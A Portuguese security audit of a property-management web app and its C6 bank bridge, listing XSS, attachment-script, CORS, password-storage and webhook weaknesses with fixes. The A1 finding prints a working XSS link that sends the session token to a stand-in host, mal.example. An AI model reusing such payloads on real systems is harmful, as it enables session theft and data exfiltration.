# Auditoria de segurança — Administração de Imóveis (erp-boletos) e Ponte C6

Data: 2026-11-05 · Branch auditada: `claude/revisao-geral` (site) + worktrees `agent-ada31a4450d7d05a9` (ponte C6 fase 1, `docs/js/banco.js`, `telas/banco.js`) e `agent-a723848969648dc4a` (ponte fase 2). Nada foi alterado; só leitura. Só entram achados confirmados no código (arquivo:linha).

Legenda de caminhos: `docs/...` = repositório principal; `[ada] ...` = `.claude/worktrees/agent-ada31a4450d7d05a9/...`; `[a72] ...` = `.claude/worktrees/agent-a723848969648dc4a/...`.

## 1. Tabela resumo

| Grav. | # | Achado | Onde | Correção (resumo) |
|---|---|---|---|---|
| **Alta** | A1 | XSS refletido: `comp`, `mes` e `ordem` da URL (`#/cobrancas?comp=…`) entram em atributos HTML sem `esc()` nem validação | `docs/js/telas.js:285,290,292,303`; `telas/cobrancas.js:88,91-93,104`; `telas/faturas.js:49,72`; `telas/financeiro.js:74,120`; `telas/fechamento.js:24` | Validar formato no roteador (`/^\d{4}-\d{2}$/`, `ordem` em lista fechada) e `esc()` em toda interpolação; CSP |
| **Alta** | A2 | Anexo (qualquer tipo) aberto como `blob:` na origem do sistema → HTML/SVG anexado executa script com acesso total | `docs/js/telas/acoes.js:1267-1270`; uploads sem `accept`: `telas/comum.js:636`, `telas.js:244`, `telas/consultas.js:113`; `telas/comum.js:672` (sem `noopener`) | Abrir só PDF/imagem; o resto baixar; forçar tipo seguro no Blob; `accept`; `rel=noopener`; CSP |
| **Média** | M1 | Nenhum Content-Security-Policy / cabeçalhos de segurança | `docs/index.html:1-15`; `tools/gerar-offline.mjs:30-46` | `<meta http-equiv="Content-Security-Policy">` com os domínios usados; cabeçalhos via Cloudflare Transform Rules |
| **Média** | M2 | Senha da ponte C6 em texto claro no JSON compartilhado (`config_banco.senha_ponte`) e no `value` do input | `[ada] docs/js/regras.js:34,3328`; `[ada] docs/js/telas/banco.js:154` | Senha fora do JSON (por navegador/usuário), Cloudflare Access obrigatório, não ecoar no input |
| **Média** | M3 | Ponte: sem limite de tentativas na senha; senha vazia aceita; origem `null` liberada por padrão no CORS | `[ada] ponte-c6/servidor.mjs:94,569-575`; `.env.exemplo` `PONTE_ORIGEM` | Recusar iniciar sem senha longa; bloqueio progressivo por IP; tirar `null`; Access na frente |
| **Média** | M4 | Ponte repassa ao banco o pedido do navegador quase sem validar (payer, notificações, chave Pix, fees) | `[ada] ponte-c6/servidor.mjs:321-327,342-357` | Allowlist de campos; chave Pix da conta vem da ponte; limites; valor máximo por conta |
| **Média** | M5 | Dados pessoais (nome, CPF, endereço do pagador) em texto claro em `registros/*.jsonl` e `notificacoes/*.jsonl`, expostos em `/roteiro` | `[ada] ponte-c6/servidor.mjs:200-209,584,589` | Mascarar `tax_id`/e-mail; desligar registros em produção; retenção |
| **Média** | M6 | Webhook sem segredo e sem limite: qualquer um grava 2 MB/chamada em disco; DoS | `[ada] ponte-c6/servidor.mjs:577-586,553-565` | Token aleatório na URL do webhook; limite 64 KB; rotação do arquivo |
| **Média** | M7 | Senhas de usuário: PBKDF2 150k, mínimo 6 caracteres; hash+sal no mesmo JSON (força bruta offline fácil) | `docs/js/auth.js:2`; `telas/envios.js:291,308,322`; `telas/cadastros.js:724` | 600k iterações, mínimo 10-12 caracteres, re-hash no login |
| **Média** | M8 | Sessão: token em localStorage renovado sem limite absoluto; na versão offline (`file://`) localStorage/IndexedDB são compartilhados com qualquer HTML local | `docs/js/app.js:27-58,429`; `tools/gerar-offline.mjs` | Limite absoluto; na versão offline não lembrar sessão; CSP |
| Baixa | B1 | jsPDF 2.5.1 desatualizado (CVE-2025-29907, CVE-2025-57810); exposição baixa (só canvas próprio) | `docs/vendor/jspdf.umd.min.js` (cabeçalho) | Atualizar para 3.0.x e regerar offline |
| Baixa | B2 | Backup seguro: cabeçalho não autenticado; `iteracoes` do arquivo usado sem limite (DoS por arquivo adulterado) | `docs/js/backup-seguro.js:55,78-84,96-107` | Limitar `iteracoes`; cabeçalho como `additionalData` do AES-GCM |
| Baixa | B3 | Erros da ponte vazam caminhos do disco e mensagens internas | `[ada] ponte-c6/servidor.mjs:128-130,629` | Mensagem genérica em 500; não devolver caminhos |
| Baixa | B4 | `SIMULADO=1` é o padrão do `.env.exemplo`; nada impede simulado com conta `producao` configurada | `[ada] ponte-c6/.env.exemplo`; `servidor.mjs:95` | Recusar `SIMULADO=1` com conta em produção; banner permanente |
| Baixa | B5 | Merge das worktrees pode regredir `OCULTOS`/`SECRETO` (base antiga sem `sessoes`) | `[ada] docs/js/regras.js:301`; `[ada] docs/js/exportar.js:15` | Conferir no merge que `sessoes` continua oculto |
| Baixa | B6 | Fase 2: método `DELETE` e corpo em DELETE não são aceitos pelo servidor atual (CORS só GET/POST; corpo só em POST) | `[a72] rotas-fase2.mjs:143-147` vs `[ada] servidor.mjs:532,616` | Alinhar antes de montar (funcional, não falha de segurança) |
| Baixa | B7 | Importação de ZIP: nome final do arquivo não passa por `limparNome`; falha no meio deixa importação parcial | `docs/js/armazenamento.js:329-336` | `limparNome` no nome final; importar para pasta temporária e trocar no fim |

## 2. Achados detalhados

### A1 — XSS refletido por parâmetro do endereço (hash) — ALTA

**Onde.** O roteador (`docs/js/app.js:380-384`, `rotaAtual`) decodifica `?comp=…&ordem=…&mes=…` com `URLSearchParams` e `docs/js/telas.js` repassa cru:
- `telas.js:285` → `telaCobrancas(rota.q.comp || …, rota.q.ordem)`; em `telas/cobrancas.js:92` `<input type="month" name="comp" value="${comp}">`, `:88` `href="#/imprimir/demonstrativos?comp=${comp}"`, `:91/:93` `…&ordem=${ordem}`, `:104` `data-ordem-boletos="${comp}"`.
- `telas.js:290` → `telaFaturas(rota.q.mes)`; `telas/faturas.js:49` `value="${mes}"`, `:72` `href="#/imprimir/faturas?mes=${mes}"`.
- `telas.js:292` → `telaImpostos(rota.q.mes)`; `telas/financeiro.js:120` `value="${comp}"`; `telas.js:293` → `telaContas` → `financeiro.js:74` `value="${comp}"`.
- `telas.js:303` → `telaFechamento(rota.q.mes)`; `telas/fechamento.js:24` `href="#/contas/${id}?comp=${mes}"`.

Nenhum desses valores é validado (`C.somarMeses` só é aplicado nos links de mês anterior/seguinte; o valor original é usado como está).

**Cenário.** 1) O atacante manda por WhatsApp/e-mail a um usuário o link `https://erp.ankjck.com.br/#/cobrancas?comp=2026-01%22%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch('https://mal.example/?d='%2Bbtoa(localStorage.getItem('imoveis-sessao')))%22%3E`. 2) O usuário tem a sessão lembrada (12 h, `app.js:27`) e a pasta com permissão lembrada: a tela de boletos é desenhada com `value="2026-01"><img src=x onerror="…">` e o script roda **na origem do sistema**. 3) Sem CSP (M1) o script pode: ler `localStorage['imoveis-sessao']` (token válido para qualquer navegador); abrir o IndexedDB `imoveis` (`armazenamento.js:18-38`), pegar o handle da pasta (permissão já concedida nesta sessão) e ler **o JSON inteiro** (todos os inquilinos, CPFs, valores, `usuarios[].senha_hash`, e, com a integração, `config_banco.senha_ponte`) e os anexos, enviando tudo para fora com `fetch`; gravar no JSON (criar usuário admin, inserir token em `sessoes`), o que o sistema aceita sem conferir origem. Com a senha da ponte, emitir/cancelar/negativar boletos na conta C6 (M2/M4).

**Impacto.** Vazamento total e alteração dos dados, por um clique num link; não exige acesso à pasta.

**Correção.**
- Em `telas.js` validar antes de passar: `const mes = /^\d{4}-\d{2}$/.test(rota.q.mes || '') ? rota.q.mes : padrão`; `ordem` só se `ORDENS_BOLETO[ordem]` (já existe o fallback no sort, `cobrancas.js:76`, mas não no HTML).
- Regra de projeto: toda interpolação em atributo (`value=`, `href=`, `data-*=`) passa por `esc()` mesmo quando "parece data". Sugestão de teste: `node tools/mapa.mjs` + grep `value="\${[^e]` nos arquivos de `telas/`.
- CSP (M1) como segunda barreira.

### A2 — Anexo aberto em nova aba como `blob:` da origem do sistema (XSS armazenado por arquivo) — ALTA

**Onde.** `docs/js/telas/acoes.js:1267-1270`:
```js
async abrirArquivo({ escopo, id, nome }) {
  const arq = await S.abrirArquivo(await pastaDoEscopo(escopo, Number(id)), nome);
  window.open(URL.createObjectURL(arq), '_blank');
},
```
O `File` devolvido por `getFile()` recebe o tipo MIME **pela extensão** do arquivo em disco; um `.html`/`.htm`/`.svg`/`.xhtml` abre como documento. Entradas de upload sem filtro: `telas/comum.js:636` (`data-upload` genérico — inquilino, imóvel, reformas; só o anúncio tem `accept="image/*"`), `telas.js:244` (matrícula), `telas/consultas.js:113` (guias do IPTU). Também `telas/comum.js:672` abre a foto do anúncio com `<a href="${u}" target="_blank">` sem `rel="noopener"` (o navegador atual já aplica `noopener` implícito, mas não conte com isso).

**Cenário.** 1) Um inquilino (ou alguém que compartilha a pasta no OneDrive) entrega "comprovante-pix.html" ou "planta.svg" com `<script>`. 2) O operador anexa na pasta do inquilino (ou o arquivo é simplesmente copiado para `arquivos/<imóvel>/Inquilinos/...` pelo OneDrive). 3) Qualquer usuário, inclusive o administrador, clica no "📎 nome" (`telas/comum.js:680`, `telas/contrato.js:386,435,531,550,585`, `telas/cadastros.js:93`). 4) O documento abre em `blob:https://erp.ankjck.com.br/…` — **mesma origem** do sistema — e o script tem o mesmo poder descrito em A1 (localStorage, IndexedDB com o handle da pasta, leitura/escrita do JSON), além de `window.opener` apontando para a aba do sistema.

**Impacto.** Igual a A1, mas persistente e sem precisar de link: basta um arquivo na pasta.

**Correção (específica).**
- Em `abrirArquivo`: só abrir na aba tipos de visualização segura (`application/pdf`, `image/jpeg|png|webp|gif`); para os demais chamar `baixar()` (já existe, `app.js:270`). Criar o Blob forçando o tipo: `new Blob([arq], { type: TIPOS_SEGUROS.has(arq.type) ? arq.type : 'application/octet-stream' })` (um `.svg` com tipo `application/octet-stream` não executa).
- Nas entradas de upload genéricas, `accept="application/pdf,image/*,.docx,.xlsx"` e, ao salvar (`armazenamento.js:140-148`), recusar extensões executáveis no navegador (`.html .htm .xhtml .svg .xml .mht .js`), renomeando para `.txt` ou bloqueando.
- `rel="noopener noreferrer"` em `comum.js:672` e usar `window.open(url, '_blank', 'noopener')` em `acoes.js:1269` e `[ada] acoes.js:1554`.
- CSP (M1): documentos `blob:` herdam a política de quem os criou; `script-src 'self'` bloqueia o script inline do anexo.

### M1 — Sem CSP nem cabeçalhos de segurança — MÉDIA

**Onde.** `docs/index.html:1-15` não tem `<meta http-equiv="Content-Security-Policy">`; GitHub Pages não permite cabeçalhos próprios. Scripts são carregados só da própria origem (`app.js:279-301`, `carregarScript('vendor/...')`); não há CDN de terceiros (verificado em `docs/css/estilo.css`: sem `@import`/`url(http`). As chamadas externas são só `https://viacep.com.br`, `https://brasilapi.com.br`, `https://api.bcb.gov.br` (`telas/campos.js:44,82,443,467`) e a ponte.

**Por que importa.** É a única barreira que transforma A1/A2 de "vazamento total" em "nada acontece": sem `script-src`, qualquer injeção executa; sem `connect-src`, o dado sai por `fetch`.

**Correção.** Em `docs/index.html` (e no `tools/gerar-offline.mjs:30-46`, com hashes dos 6 `<script>` inline ou `'unsafe-inline'` só na versão offline):
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' https://viacep.com.br https://brasilapi.com.br https://api.bcb.gov.br http://localhost:8765 http://127.0.0.1:8765 https://banco.ankjck.com.br; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'">
```
(`style-src 'unsafe-inline'` é necessário porque há muitos `style="…"` e o `<style>` de `contratos.js:371-379`; `img-src data:` para a logo em `E.d.logo` e `blob:` para fotos.) `frame-ancestors`, HSTS, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Permissions-Policy` não funcionam em `<meta>`: configurar no Cloudflare (Rules → Transform Rules → Modify Response Header) quando `erp.ankjck.com.br` estiver com a nuvem laranja. Validar com `node tools/checar.mjs` e no navegador (`?teste`) que PDF/Excel/ZIP continuam funcionando (os vendors são `'self'`).

### M2 — Senha da ponte em texto claro no JSON compartilhado — MÉDIA

**Onde.** `[ada] docs/js/regras.js:34` (`CONFIG_BANCO_PADRAO.senha_ponte`), `:3328` (gravada como digitada em `d.config_banco.senha_ponte`); o histórico a esconde (`:3335-3336`, bom), mas o JSON `imoveis-dados.json` a contém em claro, e `[ada] docs/js/telas/banco.js:154` a devolve no `value` do `<input type="password">` (visível no inspetor/“ver código”). O cliente manda a senha em todo pedido (`[ada] docs/js/banco.js:52`).

**Cenário.** Qualquer pessoa com acesso à pasta do OneDrive (inclusive usuário com papel "Consulta", ex-funcionário com a pasta sincronizada, ou quem explorou A1/A2) lê `config_banco.senha_ponte` e `ponte_url`. Com a ponte publicada em `https://banco.ankjck.com.br` (plano em `documentacao/LIGAR_C6.md:91`), ela emite boletos em nome da ANK/JCK, cancela os legítimos, agenda negativação de inquilinos (`servidor.mjs:420-447`) e, na fase 2, monta lotes de pagamento para aprovação (`[a72] rotas-fase2.mjs:134-150`).

**Correção.** A senha da ponte não deve morar no banco compartilhado: guardar no navegador do operador (IndexedDB/`localStorage`, digitada uma vez por computador, como a pasta do backup seguro) e, de preferência, por usuário. Não preencher o `value` do input (mostrar só "(definida)"). Em produção, exigir Cloudflare Access (login por e-mail da empresa) na frente de `banco.ankjck.com.br`: a senha da ponte passa a ser a segunda barreira, não a única.

### M3 — Ponte: força bruta na senha, senha vazia aceita e origem `null` — MÉDIA

**Onde.** `[ada] ponte-c6/servidor.mjs:569-575`:
```js
const senhaConfere = (cfg, req) => {
  if (!cfg.senha) return true;           // sem PONTE_SENHA a ponte fica aberta
  ...crypto.timingSafeEqual(a, b);       // comparação em tempo constante: correto
};
```
Não há contagem de erros, atraso nem bloqueio por IP. `:94`: `PONTE_ORIGEM` padrão inclui `null` (`.env.exemplo` idem) — a origem `null` é a de **qualquer** arquivo `file://`, iframe `sandbox`, `data:` URL ou redirecionamento, não só a da versão offline. O CORS reflete a origem (`:522-526`) e a senha vai num cabeçalho simples (`x-senha-ponte`), aceito no preflight.

**Cenário.** 1) Com o túnel ligado e sem Cloudflare Access, um robô faz tentativas ilimitadas em `GET https://banco.ankjck.com.br/saude` com `X-Senha-Ponte` variando; uma senha "frase curta" cai em horas. 2) Localmente, se `PONTE_SENHA` ficou vazia (o servidor só avisa no console, `:650`), qualquer página aberta num iframe sandbox ou qualquer HTML baixado e aberto do disco chama `http://127.0.0.1:8765/contas/ank/boletos` com origem `null` e é atendida.

**Correção.** Recusar iniciar sem `PONTE_SENHA` com ≥ 20 caracteres (ou gerar uma e imprimir no console na 1ª execução); contador de erros por IP (`req.socket.remoteAddress`/`CF-Connecting-IP`) com atraso progressivo (1 s, 2 s, 4 s…) e bloqueio de 15 min após 10 erros; tirar `null` do padrão e documentar que a versão offline só usa a ponte no mesmo computador; no Cloudflare: Access (política por e-mail), WAF rate limiting em `/`, e opcionalmente mTLS do túnel (Access → Service Auth → mTLS) para o navegador do escritório.

### M4 — Ponte repassa ao banco o pedido do navegador quase sem validar — MÉDIA

**Onde.** `[ada] ponte-c6/servidor.mjs:321-327` (`validarPedido`: só confere a presença de `amount`, `due_date`, `description`, `payer`, `payment_method`, o formato de `external_reference_id` e `amount > 0`); `:342-357` envia `pedido` tal como veio (`chamarC6(..., 'POST', ..., pedido)`). Não há limite de valor (o site limita em `regras.js:3499`, mas a ponte não), nem validação de `payer.tax_id`, `payer_notification[].destination`, `payment_method.pix.key`, `fees`, tamanhos (M.LIMITES existe em `mapa-c6.mjs` e não é usado na ponte).

**Cenário.** Quem tiver a senha da ponte (M2/M3) monta um POST direto (sem passar pelo site) emitindo boletos de R$ 5 milhões contra CPFs arbitrários, com `payer_notification` por e-mail/SMS para vítimas — golpe do boleto com a marca e a conta reais da empresa — ou usa a conta para cobranças que não existem no sistema (não aparecem no ERP, só no extrato).

**Correção.** A ponte é o lugar de confiança: validar com allowlist estrita — `tax_id` 11/14 dígitos com DV; `amount ≤ limite por conta` (ex.: `C6_ANK_VALOR_MAXIMO=50000`); `payment_method.pix.key` **substituída** pela da conta (`conta.chave_pix` de `chave_pix.txt`, já lida em `:76`, hoje "só informativo"); `payer_notification` só para o `payer.email`/telefone do próprio pedido; textos cortados em `M.LIMITES`; descartar qualquer campo fora de `M.CAMPOS`. Registrar `external_reference_id` emitidos para detectar emissão fora do sistema.

### M5 — Dados pessoais em texto claro nos registros da ponte — MÉDIA

**Onde.** `[ada] ponte-c6/servidor.mjs:200-209` (`registrarChamada` grava `status` e até 4000 caracteres do **corpo da resposta** de cada chamada em `registros/AAAA-MM-DD.jsonl`: a consulta de boleto traz nome, CPF, endereço e e-mail do pagador); `:577-586` grava o webhook inteiro em `notificacoes/<conta>.jsonl` e `:584` imprime o resumo no console; `:589` `GET /roteiro` devolve esses registros a quem tiver a senha. O `access_token` é mascarado (`:168`) e o `client_secret` nunca é gravado — bom.

**Impacto.** Base paralela de dados pessoais (LGPD) no computador da ponte, sem retenção, legível por qualquer processo do usuário e exportável por `/roteiro`.

**Correção.** Mascarar antes de gravar (`tax_id` → `***.***.247-25`, e-mail/telefone parciais) ou gravar só `{status, id, external_reference_id, status_banco}`; `PASTA_REGISTROS=` (vazio) em produção depois da homologação; apagar `.jsonl` com mais de 30 dias; `/roteiro` só com `--roteiro` no terminal. Permissões: `chmod 700 contas/ registros/ notificacoes/` (Linux) / ACL só do usuário (Windows).

### M6 — Webhook sem segredo e sem limite — MÉDIA

**Onde.** `[ada] ponte-c6/servidor.mjs:577-586`: `POST /webhook/c6/:conta` sem senha (correto, o C6 não assina), aceita qualquer corpo JSON de até 2 MB (`lerCorpo`, `:553-565`) e o anexa no `.jsonl`. O design de **só reconsultar o boleto** ao receber o aviso (`mapa-c6.mjs:31`, comentário em `servidor.mjs:573-576`) está certo: replay não registra pagamento falso.

**Cenário.** Descoberta a URL (`https://banco.ankjck.com.br/webhook/c6/ank`), um robô envia 2 MB por segundo: o disco do computador da ponte enche e `GET /notificacoes` (`:466-470`, lê o arquivo inteiro na memória) passa a travar.

**Correção.** Cadastrar no C6 a URL com segredo (`/webhook/c6/ank/<32 hex aleatórios>` de `C6_ANK_WEBHOOK_TOKEN`) e recusar o resto; limite de 64 KB para o webhook; validar que `information` é JSON com `external_reference_id` de boleto conhecido antes de guardar; rotacionar/limitar o `.jsonl` (ex.: 5 MB). No Cloudflare, se o Access proteger o host inteiro, criar política **Bypass** só para `/webhook/*` com rate limiting do WAF.

### M7 — Senhas dos usuários: parâmetros fracos para um hash que fica no arquivo compartilhado — MÉDIA

**Onde.** `docs/js/auth.js:2` `ITERACOES = 150000` (PBKDF2-HMAC-SHA256, sal de 16 bytes aleatório, `:6-8`, correto); mínimo de 6 caracteres em `telas/envios.js:291,308,322` e `telas/cadastros.js:724`; `senha_hash`/`senha_sal` ficam em `imoveis-dados.json` ao lado dos dados.

**Cenário.** Quem tem a pasta já tem os dados, então a senha protege pouco *este* sistema — mas as pessoas reutilizam senhas. Com o JSON em mãos, um PC com GPU testa ~10⁴–10⁵ senhas/s a 150k iterações; "6 caracteres" (letras minúsculas: 3×10⁸) cai em horas; a senha recuperada serve no e-mail/banco do funcionário.

**Correção.** 600.000 iterações (recomendação OWASP para PBKDF2-SHA256) ou mais; mínimo 10-12 caracteres (frase); guardar `senha_iteracoes` no usuário e re-hash no `entrar` (`app.js:348-357`) quando for menor que o atual (a `ARQUITETURA.md` já alerta que mudar o parâmetro invalida senhas: por isso a migração deve ser no login, não em `normalizar`).

### M8 — Sessão: renovação sem limite e versão offline em `file://` — MÉDIA

**Onde.** `docs/js/app.js:27-58`: sessão `{login, token, ate}` em `localStorage`, 12 h deslizantes, renovada em todo `mostrar()` (`:429`); token de 128 bits aleatórios (`:52`, bom) conferido contra `usuarios[].sessoes` (`:57`, até 10). Versão offline (`tools/gerar-offline.mjs`) abre em `file://`: no Chrome/Edge, **todas** as páginas `file://` compartilham o mesmo `localStorage`/IndexedDB.

**Cenário.** O usuário abre `Administração de Imóveis.html` do disco e, depois, qualquer outro HTML baixado (nota fiscal falsa, "comprovante.html") no mesmo navegador: esse HTML lê `localStorage['imoveis-sessao']` e o handle da pasta no IndexedDB `imoveis` e, se a permissão da pasta estiver concedida, lê/grava o JSON. Com o site (`https://`) isso não ocorre (origem própria), mas um XSS (A1/A2) rouba o token igualmente.

**Correção.** Limite absoluto de sessão (ex.: 7 dias desde o login, guardando `criada_em`); quando `location.protocol === 'file:'`, não lembrar sessão (usar `sessionStorage`) e não lembrar a pasta; mostrar aviso na tela "Baixar a versão sem internet" (`telas/admin.js:155`) para abrir o arquivo só num perfil do navegador dedicado. Ao sair, o token é removido do banco (`app.js:367-375`, bom).

### B1 — Dependências em `docs/vendor` — BAIXA

Versões lidas nos cabeçalhos: JSZip **3.10.1** (atual; corrige zip-slip e poluição de protótipo das versões < 3.8), ExcelJS **4.4.0** (build 19-10-2023, última publicada; embute JSZip 3.10.1), html2canvas **1.4.1** (última), jsPDF **2.5.1** (2022). jsPDF 2.5.1 tem CVE-2025-29907 (ReDoS em `addImage` com data URL maliciosa; corrigido em 3.0.1) e CVE-2025-57810 (DoS em PNG; 3.0.2); CVE-2025-68428 (leitura de arquivo local) só afeta Node. Exposição aqui é baixa: `addImage` recebe só o canvas gerado pelo próprio sistema (`telas/documentos.js:146`, `telas/acoes.js:97`). Recomendação: atualizar `jspdf.umd.min.js` para 3.0.x (mesma API UMD `jspdf.jsPDF`) e rodar `node tools/checar.mjs --offline`. ExcelJS lê o modelo `.xlsx` enviado pelo usuário (`telas/envios.js:589-595`): arquivo malicioso pode só travar a aba (zip bomb) — aceitável.

### B2 — Backup seguro: cabeçalho não autenticado — BAIXA

`docs/js/backup-seguro.js`: RSA-OAEP 3072 + AES-GCM 256 com IV de 12 bytes aleatório por arquivo (`:74-77`) e chave privada cifrada por PBKDF2 310k (`:17,34-37,46`) — desenho correto; o conteúdo tem integridade (GCM). Mas o cabeçalho JSON (`:78-84`) é lido sem autenticação: `abrirPrivada` usa `chave.iteracoes` do **arquivo** (`:55`) — um `.bkp` adulterado com `iteracoes: 2000000000` trava o navegador na restauração; `tipo`, `arquivo`, `revisao`, `criado_em` podem ser trocados (um backup antigo "vira" recente na lista). Correção: ao ler, exigir `100000 ≤ iteracoes ≤ 2000000`; passar `texto(JSON.stringify(cabecalho_sem_chave))` como `additionalData` do `encrypt`/`decrypt` do conteúdo. Senha mínima de 8 (`:41`): subir para 12.

### B3 — Mensagens de erro da ponte — BAIXA

`[ada] servidor.mjs:629` devolve `e.message` até para erros 500 (ex.: `ENOENT … C:\Imoveis\ponte-c6\contas\ank\chave.key`); `faltamNaConta` (`:128-130`) e `/saude` devolvem o caminho do certificado. Só com a senha, mas facilita o próximo passo de um invasor. Correção: em `status >= 500` responder texto fixo e logar o detalhe só no console; em `faltam` não incluir caminhos.

### B4 — Modo simulado — BAIXA

`.env.exemplo` entrega `SIMULADO=1`; `ambiente` padrão é `sandbox` (`servidor.mjs:69`, seguro). O site marca `simulado: true` e "Sandbox (teste): não vale como cobrança" (`regras.js:3620`, `telas/banco.js:104`), o que reduz o risco de mandar boleto fictício a inquilino. Sugestão: a ponte recusar `SIMULADO=1` quando alguma conta tem `ambiente=producao`, e o site mostrar faixa fixa "MODO SIMULADO" enquanto `/saude.simulado` for verdadeiro.

### B5 — Risco de regressão no merge das worktrees — BAIXA

A base das worktrees (`d2a3d77`/`bf410e8`) é anterior ao commit `3f5c58b` que acrescentou `'sessoes'` em `OCULTOS` (`docs/js/regras.js:267`) e `^sessoes$` em `SECRETO` (`docs/js/exportar.js:15`). Em `[ada] docs/js/regras.js:301` e `[ada] docs/js/exportar.js:15` ainda falta `sessoes`; a worktree mexe na mesma região de `regras.js` (config_banco), então o merge pode gerar conflito e perder a linha. Conferir após o merge: `grep -n "OCULTOS\|SECRETO" docs/js/regras.js docs/js/exportar.js` deve mostrar `sessoes`.

### B6 — Fase 2 não encaixa no servidor atual (funcional) — BAIXA

`[a72] rotas-fase2.mjs:143-147` usa `DELETE` com corpo; `[ada] servidor.mjs:532` só libera `GET, POST, OPTIONS` no CORS e `:616` só lê corpo em POST. Ao montar, alinhar (ex.: `POST …/itens/remover`) — e aplicar M3/M4 também às rotas de pagamento (`decodificar`/`enviar`), que hoje confiam só na senha.

### B7 — Importação de ZIP — BAIXA

`docs/js/armazenamento.js:306-338`: bloqueia `..`, caminhos absolutos e pastas fora de `arquivos/`/`modelos/` (`:313-315`, bom), faz backup antes (`:324-328`, bom), mas o nome final do arquivo não passa por `limparNome` (`:334`): um nome inválido para o sistema de arquivos faz `getFileHandle` lançar no meio do laço, deixando a pasta com metade dos anexos novos e o JSON antigo (o `gravarBanco` fica para o fim, `:336`). Correção: `limparNome(partes.at(-1))` e, idealmente, extrair para `arquivos-importando/` e renomear no fim.

## 3. Dados em repouso: cifrar o `imoveis-dados.json`?

**Situação.** O JSON (`armazenamento.js:69-92`) e os 30 backups diários (`:95-104`) ficam em texto claro na pasta/OneDrive; quem tem a pasta tem tudo (o próprio `README.md` avisa). O login só controla a interface. O backup seguro já cifra (B2) com WebCrypto, então a técnica está no projeto.

**Viável?** Sim. Desenho sugerido (envelope, igual ao do backup seguro):
- Uma **chave de dados (DEK)** AES-GCM-256 aleatória cifra o corpo do banco (todas as tabelas, histórico, logo). Em claro fica só um envelope: `{ formato: 'imoveis-v2', revisao, revisao_so_sessao, atualizado_em/por, usuarios: [{ id, login, nome, papel, ativo, pendente, senha_sal, senha_hash, sessoes, dek_embrulhada, chave_publica, chave_privada_cifrada }], dados_cifrados: base64, iv }`.
- Cada usuário tem um par RSA-OAEP (como em `backup-seguro.js:42`): a privada cifrada pela senha (PBKDF2 ≥ 600k); a DEK é embrulhada com a pública de cada usuário ativo. Assim o administrador aprova um pedido de acesso (`telas/envios.js:308-313`) embrulhando a DEK com a pública do pendente **sem saber a senha dele**.
- "Lembrar por 12 h": guardar a DEK como `CryptoKey` **não extraível** no IndexedDB (WebCrypto permite), ao lado do handle da pasta; o token em `sessoes` continua como hoje.
- Recuperação: chave de recuperação (frase de 24 palavras ou arquivo `.key` impresso/guardado no cofre) que também embrulha a DEK; sem ela, perder todas as senhas = perder os dados.
- Migração em `normalizar`/`lerBanco`: ao abrir `imoveis-v1` com usuário logado, cifrar e gravar `v2` (uma vez); backups diários passam a ser cifrados (o `.bkp` já existe para isso).

**Custo.** 2-3 dias de desenvolvimento e teste (envelope, aprovação de usuário, troca de senha = re-embrulhar, recuperação, `verificarMudancasExternas` decifrando a cada 30 s — um JSON de 1-5 MB decifra em milissegundos), mais a tela de recuperação e documentação para o dono.

**Prós.** Pasta/OneDrive comprometidos (notebook perdido, compartilhamento errado, conta Microsoft invadida, ex-funcionário com sincronização) não expõem os dados; A1/A2 continuam graves (a página tem a DEK em memória), por isso CSP e as correções acima vêm antes.

**Contras.** (1) OneDrive sincroniza o arquivo inteiro a cada gravação (hoje também, pois é um JSON único; só perde a legibilidade). (2) Cópias em conflito (`copiasEmConflito`) continuam detectáveis por nome, mas não dá mais para abrir no Bloco de Notas para comparar. (3) Vários usuários: cada novo usuário depende de um administrador logado para receber a DEK (já é assim para aprovação). (4) **Anexos** (`arquivos/`) continuariam em claro: cifrá-los exige decifrar para abrir cada PDF/foto e quebra o uso da pasta pelo Explorer/OneDrive; custo alto, ganho parcial. (5) Senha esquecida sem chave de recuperação = perda total; exige disciplina.

**Alternativa barata enquanto não se cifra:** pasta fora de compartilhamentos amplos, BitLocker nos computadores, OneDrive com 2FA e sem "compartilhar link", backup seguro ligado (já cifrado), papel "Consulta" para quem não precisa editar — e lembrar que quem tem a pasta tem o JSON.

## 4. Cadeia de suprimento (GitHub Pages → navegador)

Quem controlar a conta GitHub ou a branch `main` troca `docs/js/app.js` e rouba os dados de todo mundo que abrir o site (o código roda com acesso à pasta). Verificado: não há GitHub Actions (`.github/` não existe) nem CDN de terceiros (vendors locais, CSS sem `@import`); não há `docs/CNAME` ainda (o domínio será configurado pela interface do Pages, `documentacao/PUBLICAR_NO_DOMINIO.md`).

Proteções recomendadas (todas fora do código):
1. **Conta GitHub**: 2FA com chave física/passkey (não SMS); e-mail de recuperação com 2FA; revisar "Authorized OAuth Apps"/tokens; **Vigilant mode** (commits não assinados ficam marcados).
2. **Branch protection em `main`** (Settings → Branches): exigir PR, ≥ 1 aprovação humana, bloquear force-push e exclusão, exigir commits assinados, "Require linear history"; exigir status check (um workflow mínimo rodando `node tools/checar.mjs`, sem secrets, ou manter sem Actions e rodar localmente antes do merge). Os agentes trabalham em branches/worktrees: nada vai para `main` sem o dono revisar o diff.
3. **Pages**: Settings → Pages → **Verified domains** para `ankjck.com.br` (impede outro repositório de assumir `erp.ankjck.com.br`); "Enforce HTTPS"; manter `docs/.nojekyll`.
4. **Cloudflare**: 2FA na conta; **DNSSEC** ligado na zona; SSL/TLS **Full (strict)**; "Always Use HTTPS"; **HSTS** (max-age 6 meses, includeSubDomains; preload só depois de tudo estável); Transform Rules com CSP/`X-Content-Type-Options`/`Referrer-Policy`/`Permissions-Policy` (M1); regra de cache "Bypass" para HTML (já documentado) para que uma correção de segurança chegue na hora; Zero Trust Access para `banco.ankjck.com.br` (M3).
5. **Integridade do que se publica**: `tests/offline.test.mjs` já amarra a versão offline ao hash das fontes; manter `node tools/checar.mjs --offline` como etapa obrigatória antes do merge; tag por versão (`vAAAA.MM.DD`) para saber o que estava publicado em cada data.
6. **Ponte C6**: distribuir `ponte-c6/` a partir de uma tag assinada; no computador da ponte, `node` atualizado (LTS), pasta `contas/` com permissão só do usuário, Windows com BitLocker.

## 5. O que foi verificado e está bem feito

